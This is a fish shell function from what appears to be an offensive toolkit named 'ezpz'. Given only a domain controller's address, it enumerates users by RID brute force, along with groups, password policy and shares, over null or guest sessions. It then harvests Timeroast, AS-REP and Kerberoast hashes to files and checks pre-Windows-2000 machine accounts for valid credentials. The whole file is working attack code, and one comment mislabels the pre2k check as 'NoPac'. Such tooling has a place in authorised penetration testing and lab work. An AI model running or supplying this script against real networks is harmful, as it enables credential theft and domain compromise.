function _ezpz_enumnull
    source $EZPZ_HOME/functions/_ezpz_colors.fish

    # ASCII banner
    echo ''
    echo '                         '(set_color magenta --bold)'   \ |  |  | |     |    '(set_color normal)
    echo '   -_)    \   |  |   ` \ '(set_color magenta --bold)'  .  |  |  | |     |    '(set_color normal)
    echo ' \___| _| _| \_,_| _|_|_|'(set_color magenta --bold)' _|\_| \__/ ____| ____| '(set_color normal)
    echo ''




                                                 



    # Usage message
    set usage "
Usage: ezpz enumnull -t <target> [--guest] [-k]
  Performs initial reconnaissance on a target without credentials (null session).

  -t, --target    Target IP or hostname (Required)
  --guest         Use guest account with empty password instead of null session
  -k, --kerb      Use Kerberos authentication (requires a valid TGT)

Examples:
  ezpz enumnull -t 10.10.10.10
  ezpz enumnull -t dc01.corp.local --guest
  ezpz enumnull -t dc01.corp.local --guest -k
"

    # Check required tools
    if not command -v nxc >/dev/null 2>&1
        ezpz_error "Required tool not found: nxc"
        return 1
    end

    # Parse arguments
    argparse 't/target=' 'guest' 'k/kerb' 'h/help' -- $argv
    or begin
        ezpz_error "Invalid arguments."
        echo $usage
        return 1
    end

    if set -q _flag_help
        echo $usage
        return 1
    end

    # Check required arguments
    if not set -q _flag_target
        ezpz_error "Missing required argument: -t/--target"
        echo $usage
        return 1
    end

    set target $_flag_target
    
    # Set credentials based on --guest flag
    if set -q _flag_guest
        set auth_user "guest"
        set auth_pass ""
        set auth_desc "guest account"
    else
        set auth_user ""
        set auth_pass ""
        set auth_desc "null session"
    end

    # Extract DC FQDN from /etc/hosts if needed for Kerberos
    set dc_fqdn ""
    if set -q _flag_kerb
        set dc_fqdn (awk -v target="$target" '$1 == target {max_len=0; fqdn=""; for(i=2; i<=NF; i++) {if(length($i) > max_len) {max_len=length($i); fqdn=$i}} print fqdn; exit}' /etc/hosts)
        if test -n "$dc_fqdn"
            # For Kerberos, use FQDN instead of IP
            set target $dc_fqdn
        else
            ezpz_warn "DC FQDN not found in /etc/hosts for $_flag_target. Kerberos may fail."
        end
        
        # Time synchronization for Kerberos
        if command -v ntpdate >/dev/null 2>&1
            ezpz_info "Synchronizing clock with DC for Kerberos authentication..."
            sudo systemctl stop systemd-timesyncd
            sudo ntpdate -u $_flag_target >/dev/null 2>&1
        else
            ezpz_warn "ntpdate not found. Skipping time sync. Kerberos may fail if clocks are skewed."
        end
    end

    # Create temporary files
    set users_tmp (mktemp)
    set users_temp (mktemp)
    trap 'rm -f "$users_tmp" "$users_temp"' EXIT TERM INT

    ezpz_title "Starting enumeration on $target using $auth_desc..."

    # Extract domain first (fast)
    set domain (timeout 60 nxc smb $target 2>/dev/null | grep 'domain:' | head -1 | sed -n 's/.*domain:\([^)]*\).*/\1/p')
    if test $status -eq 124
        ezpz_warn "Operation timed out. Skipping."
    end
    
    # Set users file name based on extracted domain
    set users_file "$target"_users.txt
    if test -n "$domain"
        set users_file "$domain"_users.txt
    end

    # Build nxc command arguments
    set nxc_args $target -u "$auth_user" -p "$auth_pass"
    if set -q _flag_kerb
        set -a nxc_args -k
        if set -q KRB5CCNAME
            set -a nxc_args --use-kcache
        end
    end

    # User Enumeration - prioritize --rid-brute over --users
    ezpz_header "Enumerating users with RID Bruteforcing"
    ezpz_cmd "nxc smb $nxc_args --rid-brute 10000"
    timeout 120 nxc smb $nxc_args --rid-brute 10000 2>/dev/null | grep 'SidTypeUser' | cut -d ':' -f2 | cut -d '\\' -f2 | cut -d ' ' -f1 | tee $users_tmp
    
    if test $pipestatus[1] -eq 124
        ezpz_warn "Operation timed out. Skipping."
    else if test -s $users_tmp
        cp $users_tmp $users_file
        ezpz_info "Saving enumerated users to $users_file"
    else
        ezpz_warn "No users found with --rid-brute. Trying --users as fallback..."
        
        # Fallback to --users
        ezpz_header "Enumerating users (fallback)"
        ezpz_cmd "nxc smb $nxc_args --users"
        timeout 60 nxc smb $nxc_args --users 2>/dev/null | grep -v '\[.\]' | tr -s " " | cut -d ' ' -f 5,9- | tail -n +2 | awk '{if (NF>1) {printf "%s [", $1; for (i=2; i<=NF; i++) printf "%s%s", $i, (i<NF?" ":""); print "]"} else print $1}' | tee $users_temp
        
        if test $pipestatus[1] -eq 124
            ezpz_warn "Operation timed out. Skipping."
        else if test -s $users_temp
            # Extract just usernames and save to file with -mini suffix
            set users_file_mini (string replace '.txt' '-mini.txt' $users_file)
            cat $users_temp | awk '{print $1}' > $users_tmp
            cp $users_tmp $users_file_mini
            ezpz_info "Saving enumerated users to $users_file_mini"
        else
            ezpz_warn "No users found with --users fallback."
        end
    end

    # Groups
    ezpz_header "Enumerating groups"
    ezpz_cmd "nxc ldap $nxc_args --groups"
    timeout 60 nxc ldap $nxc_args --groups 2>/dev/null | grep 'membercount' | tr -s " " | cut -d ' ' -f 5- | grep -v 'membercount: 0' | sed "s/membercount:/-/g"
    if test $pipestatus[1] -eq 124
        ezpz_warn "Operation timed out. Skipping."
    end

    # Password Policy
    ezpz_header "Enumerating password policy"
    ezpz_cmd "nxc smb $nxc_args --pass-pol"
    timeout 60 nxc smb $nxc_args --pass-pol 2>/dev/null | grep -v '\[.\]' | tr -s " " | cut -d ' ' -f 5-
    if test $pipestatus[1] -eq 124
        ezpz_warn "Operation timed out. Skipping."
    end

    # Shares Enumeration
    ezpz_header "Enumerating shares"
    ezpz_cmd "nxc smb $nxc_args --shares --smb-timeout 999"
    set shares_output (mktemp)
    timeout 60 nxc smb $nxc_args --shares --smb-timeout 999 2>/dev/null | grep -E "READ|WRITE" | tr -s " " | cut -d " " -f 5- > $shares_output
    
    if test $pipestatus[1] -eq 124
        ezpz_warn "Operation timed out. Skipping."
    else if test -s $shares_output
        # Format shares as table using READ/WRITE as delimiter
        printf "%-20s %-15s %s\n" "SHARE NAME" "PERMISSIONS" "DESCRIPTION"
        printf "%-20s %-15s %s\n" "----------" "-----------" "-----------"
        cat $shares_output | awk '
        {
            line = $0
            if (match(line, /READ,WRITE/)) {
                share = substr(line, 1, RSTART-1)
                perm = "READ,WRITE"
                desc = substr(line, RSTART+10)
            } else if (match(line, /READ/)) {
                share = substr(line, 1, RSTART-1)
                perm = "READ"
                desc = substr(line, RSTART+5)
            } else if (match(line, /WRITE/)) {
                share = substr(line, 1, RSTART-1)
                perm = "WRITE"
                desc = substr(line, RSTART+6)
            }
            gsub(/^[ \t]+|[ \t]+$/, "", share)
            gsub(/^[ \t]+|[ \t]+$/, "", desc)
            printf "%-20s %-15s %s\n", share, perm, desc
        }'
    end
    
    # Cleanup temp file
    rm -f $shares_output

    ezpz_title "Looking for exploitable accounts..."

    # Timeroast - works without authentication
    ezpz_header "Searching for Timeroastable accounts"
    set time_file "$target"_time.hash
    if test -n "$domain"
        set time_file "$domain"_time.hash
    end
    ezpz_cmd "nxc smb $_flag_target -M timeroast"
    nxc smb $_flag_target -M timeroast 2>/dev/null | grep -v '\[.\]' | tr -s " " | cut -d ' ' -f 5 | tee $time_file
    if test -s $time_file
        ezpz_info "Saving hashes to $time_file"
    end

    # Test for exploitable accounts if user files exist
    set users_file_full "$target"_users.txt
    set users_file_mini "$target"_users-mini.txt
    if test -n "$domain"
        set users_file_full "$domain"_users.txt
        set users_file_mini "$domain"_users-mini.txt
    end

    set active_users_file ""
    if test -f $users_file_full
        set active_users_file $users_file_full
    else if test -f $users_file_mini
        set active_users_file $users_file_mini
    end

    if test -n "$active_users_file"
        ezpz_header "Searching for AS-REProastable accounts"
        set asrep_file "$target"_asrep.hash
        if test -n "$domain"
            set asrep_file "$domain"_asrep.hash
        end

        # Build GetNPUsers command for null session
        set getnpusers_cmd GetNPUsers.py "$domain/" -usersfile "$active_users_file" -dc-ip "$_flag_target"
        if set -q _flag_kerb -a -n "$dc_fqdn"
            set -a getnpusers_cmd -k -dc-host "$dc_fqdn"
        end
        
        ezpz_cmd "$getnpusers_cmd"
        set output ($getnpusers_cmd 2>&1)
        set hash_lines (string split '\n' $output | grep '^\$krb5asrep\$')
        
        # Show and save hash lines if found
        if test -n "$hash_lines"
            for hash in $hash_lines
                echo $hash
            end
            printf '%s\n' $hash_lines > $asrep_file
            ezpz_info "Saving hashes to $asrep_file"
            
            # Extract first AS-REP roastable user for Kerberoasting
            set asrep_user (echo $hash_lines[1] | grep -oE '\$[^@]+@[^:]+' | cut -d'@' -f1 | cut -d'$' -f3)
            if test -n "$asrep_user"
                ezpz_header "Searching for Kerberoastable accounts using AS-REP user"
                set kerb_file "$target"_kerb.hash
                if test -n "$domain"
                    set kerb_file "$domain"_kerb.hash
                end
                
                set getuserspns_cmd GetUserSPNs.py "$domain/" -no-preauth "$asrep_user" -usersfile "$active_users_file" -dc-ip "$_flag_target"
                if set -q _flag_kerb -a -n "$dc_fqdn"
                    set -a getuserspns_cmd -k -dc-host "$dc_fqdn"
                end
                
                ezpz_cmd "$getuserspns_cmd"
                set spn_output ($getuserspns_cmd 2>&1)
                set spn_hash_lines (string split '\n' $spn_output | grep '^\$krb5tgs\$')
                
                # Show and save hash lines if found
                if test -n "$spn_hash_lines"
                    for hash in $spn_hash_lines
                        echo $hash
                    end
                    printf '%s\n' $spn_hash_lines > $kerb_file
                    ezpz_info "Saving hashes to $kerb_file"
                end
            end
        end

        # Test pre2k only if we have the full users file (not mini)
        if test "$active_users_file" = "$users_file_full" -a -s "$active_users_file"
            if command -v pre2k >/dev/null 2>&1
                ezpz_header "Searching for pre-Win2k compatible computer accounts (NoPac)"
                
                # Build pre2k command
                if set -q _flag_kerb -a -n "$dc_fqdn"
                    set pre2k_cmd pre2k unauth -d "$domain" -dc-host "$dc_fqdn" -dc-ip "$_flag_target" -inputfile "$active_users_file" -k
                    if set -q KRB5CCNAME
                        set -a pre2k_cmd -no-pass
                    end
                else
                    set pre2k_cmd pre2k unauth -d "$domain" -dc-ip "$_flag_target" -inputfile "$active_users_file"
                end
                
                ezpz_cmd "$pre2k_cmd"
                $pre2k_cmd 2>/dev/null | grep -ioE "VALID CREDENTIALS: .*" --color=never
            else
                ezpz_warn "pre2k not found. Skipping pre-Win2k computer account enumeration."
            end
        end
    end

    ezpz_success "Done."
end